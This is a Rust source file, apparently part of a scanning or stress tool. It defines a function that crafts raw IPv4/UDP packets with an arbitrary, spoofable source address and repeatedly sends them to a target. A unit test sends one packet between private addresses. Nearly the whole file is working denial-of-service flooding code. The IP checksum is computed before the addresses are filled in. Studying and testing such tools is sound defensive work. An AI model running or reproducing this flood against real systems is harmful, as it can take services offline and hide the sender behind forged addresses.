use anyhow::Result;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::udp::{ipv4_checksum, MutableUdpPacket};
use pnet::packet::Packet;
use pnet::transport::transport_channel;
use pnet::transport::TransportChannelType::Layer3;
use std::net::Ipv4Addr;

use crate::scan::IPV4_HEADER_LEN;
use crate::scan::IP_TTL;
use crate::scan::UDP_BUFF_SIZE;
use crate::scan::UDP_DATA_LEN;
use crate::scan::UDP_HEADER_LEN;
use crate::utils;

pub fn send_udp_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let udp_protocol = Layer3(IpNextHeaderProtocols::Udp);
    let (mut udp_tx, _) = match transport_channel(UDP_BUFF_SIZE, udp_protocol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => return Err(e.into()),
    };

    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_LEN + UDP_HEADER_LEN + UDP_DATA_LEN];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff[..]).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_total_length((IPV4_HEADER_LEN + UDP_HEADER_LEN + UDP_DATA_LEN) as u16);
    let id = utils::random_u16();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(IP_TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    let c = checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);

    // udp header
    let mut udp_buff = [0u8; UDP_HEADER_LEN + UDP_DATA_LEN];
    let mut udp_header = MutableUdpPacket::new(&mut udp_buff[..]).unwrap();
    udp_header.set_source(src_port);
    udp_header.set_destination(dst_port);
    udp_header.set_length((UDP_HEADER_LEN + UDP_DATA_LEN) as u16);
    let checksum = ipv4_checksum(&udp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    udp_header.set_checksum(checksum);

    // set udp header as ip payload
    ip_header.set_payload(udp_header.packet());
    for _ in 0..max_same_packet {
        match udp_tx.send_to(&ip_header, dst_ipv4.into()) {
            _ => (),
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_udp_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 130);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 136);
        let ret = send_udp_flood_packet(src_ipv4, 54321, dst_ipv4, 80, 1).unwrap();
        println!("{:?}", ret);
    }
}
